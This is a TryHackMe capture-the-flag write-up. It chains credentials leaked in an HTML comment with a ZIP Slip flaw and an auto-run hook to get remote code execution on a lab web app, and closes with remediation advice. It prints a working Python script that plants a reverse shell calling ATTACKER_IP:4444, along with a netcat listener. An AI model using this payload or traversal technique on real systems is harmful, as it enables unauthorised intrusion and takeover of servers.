# TryHackMe - The Hollow Shell (Web) Write-up

## Room Information

| Attribute | Details |
|------------|---------|
| Platform | TryHackMe |
| Category | Web |
| Difficulty | Medium |
| Target | `http://LAB_MACHINE_IP:5000` |

---

# Objective

Exploit the Byte Lotus Shoreline Display portal to achieve Remote Code Execution (RCE) and retrieve the user flag.

---

# Attack Path

```
Information Disclosure
        │
        ▼
Hardcoded Credentials
        │
        ▼
Authenticated Access
        │
        ▼
ZIP Upload
        │
        ▼
ZIP Slip (Directory Traversal)
        │
        ▼
Arbitrary File Write
        │
        ▼
Python Hook Execution
        │
        ▼
Reverse Shell
        │
        ▼
Flag Retrieval
```

---

# 1. Initial Enumeration

The supplied target did not respond on the default HTTP port, so an Nmap scan was performed.

```bash
nmap -Pn -T4 LAB_MACHINE_IP
```

Output:

```
PORT     STATE SERVICE
22/tcp   open  ssh
5000/tcp open  unknown
```

The web application was hosted on port **5000**, so browsing to:

```
http://LAB_MACHINE_IP:5000
```

redirected to:

```
/login
```

---

# 2. Information Disclosure

Inspecting the HTML source of the login page revealed an HTML comment containing starter credentials for new employees.

Using these credentials successfully authenticated us into the application.

---

# 3. Dashboard Enumeration

After authentication, the dashboard presented a ZIP upload feature.

```
Bring a shell ashore

Found something on the beach?
Upload it as a shell (.zip souvenir pack).

Each shell must contain a shell.json manifest listing its assets.

A shell may include optional automation hooks —
the theme worker applies these for you shortly after the shell comes ashore.
```

This strongly suggested that uploaded ZIP archives were processed automatically by a backend worker.

---

# 4. Exploring the Upload Functionality

A minimal ZIP archive was created containing only a `shell.json` manifest.

```json
{
    "name": "test",
    "assets": []
}
```

After uploading, the dashboard listed the uploaded shell.

The extracted manifest became publicly accessible at:

```
http://LAB_MACHINE_IP:5000/shells/<random_id>/shell.json
```

This confirmed that uploaded ZIP archives were extracted server-side and served back to users.

---

# 5. Testing for ZIP Slip

Since the archive was extracted automatically, the next step was to determine whether directory traversal was possible during extraction.

The following proof-of-concept was created.

## concept.py

```python
import json
import zipfile

manifest = {
    "name": "zipslip-proof",
    "assets": []
}

with zipfile.ZipFile("zipslip-proof.zip", "w") as archive:
    archive.writestr(
        "shell.json",
        json.dumps(manifest)
    )

    archive.writestr(
        "../../static/zipslip-proof.css",
        "ZIP_SLIP_CONFIRMED\n"
    )

print("Created zipslip-proof.zip")
```

Generate the archive:

```bash
python3 concept.py
```

Verify its contents:

```bash
unzip -l zipslip-proof.zip
```

```
Archive: zipslip-proof.zip

shell.json
../../static/zipslip-proof.css
```

Upload the archive through the dashboard.

Visiting

```
http://LAB_MACHINE_IP:5000/static/zipslip-proof.css
```

returned

```
ZIP_SLIP_CONFIRMED
```

This confirmed that the application was vulnerable to **ZIP Slip**, allowing arbitrary files to be written outside the intended extraction directory.

---

# 6. Identifying Writable Locations

The successful ZIP Slip confirmed arbitrary file write capabilities.

The application's description repeatedly referenced **automation hooks**, indicating that Python files placed inside the application's `hooks` directory would likely be executed by the background worker.

This became the target for code execution.

---

# 7. Creating the Reverse Shell Payload

The following script generated a ZIP archive that wrote a Python reverse shell into the application's hooks directory.

## build.py

```python
import json
import zipfile

LHOST = "ATTACKER_IP"
LPORT = 4444

manifest = {
    "name": "shoreline-update",
    "assets": []
}

callback = f'''
import os
import pty
import socket

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(({LHOST!r}, {LPORT}))

for descriptor in (0, 1, 2):
    os.dup2(sock.fileno(), descriptor)

pty.spawn("/bin/bash")
'''

with zipfile.ZipFile("reverse-shell.zip", "w") as archive:
    archive.writestr(
        "shell.json",
        json.dumps(manifest)
    )

    archive.writestr(
        "../../hooks/callback.py",
        callback
    )

print("Created reverse-shell.zip")
```

Generate the payload:

```bash
python3 build.py
```

Verify the archive:

```bash
unzip -l reverse-shell.zip
```

```
Archive: reverse-shell.zip

shell.json
../../hooks/callback.py
```

---

# 8. Catching the Reverse Shell

Start a Netcat listener.

```bash
nc -lvnp 4444
```

Upload the malicious ZIP archive.

After a few seconds, the background worker executed the uploaded hook and established a reverse shell.

```
Listening on 0.0.0.0 4444

Connection received on LAB_MACHINE_IP
```

---

# 9. Post Exploitation

Verify the current user.

```bash
id
```

Output:

```
uid=996(roomservice)
gid=996(roomservice)
groups=996(roomservice)
```

Enumerate the application directory.

```bash
ls
```

```
app.py
hooks
requirements.txt
shells
static
templates
theme_worker.py
venv
```

Navigate to the user's home directory.

```bash
cd /home/roomservice
```

List the contents.

```bash
ls
```

```
flag.txt
```

Read the flag.

```bash
cat flag.txt
```

```
THM{REDACTED}
```

---

# Vulnerability Analysis

| Vulnerability | Description | Impact |
|---------------|-------------|--------|
| Information Disclosure | Credentials exposed within HTML comments | Authentication bypass |
| Insecure ZIP Extraction | Uploaded archives extracted without sanitising file paths | Arbitrary file write |
| ZIP Slip | Directory traversal using `../` sequences inside ZIP entries | Write files anywhere writable by the application |
| Unsafe Hook Processing | Application automatically executed user-controlled Python hooks | Remote Code Execution |

---

# Remediation

- Never store credentials within HTML source code or comments.
- Validate archive contents before extraction.
- Reject filenames containing path traversal sequences such as:

```
../
```

- Use safe extraction methods that normalise and validate destination paths.
- Never execute user-uploaded code automatically.
- Run background workers with minimal privileges.
- Restrict upload functionality to trusted file types and validate file contents.

---

# Lessons Learned

This room demonstrates how several individually small weaknesses can be chained together into complete system compromise.

The exploitation chain consisted of:

1. Discovering credentials exposed in HTML comments.
2. Authenticating into the upload portal.
3. Testing archive extraction behaviour.
4. Confirming a ZIP Slip vulnerability.
5. Writing a malicious Python hook into the application's execution directory.
6. Waiting for the background worker to execute the hook.
7. Receiving a reverse shell.
8. Enumerating the host and retrieving the flag.

This challenge reinforces the importance of secure archive extraction, least-privilege execution, and avoiding automatic execution of user-controlled content.

---

## Skills Practised

- Web Enumeration
- HTML Source Inspection
- File Upload Testing
- ZIP Slip Exploitation
- Python Payload Development
- Reverse Shell Generation
- Linux Enumeration
- Post Exploitation
- Vulnerability Analysis
- Secure Coding Review
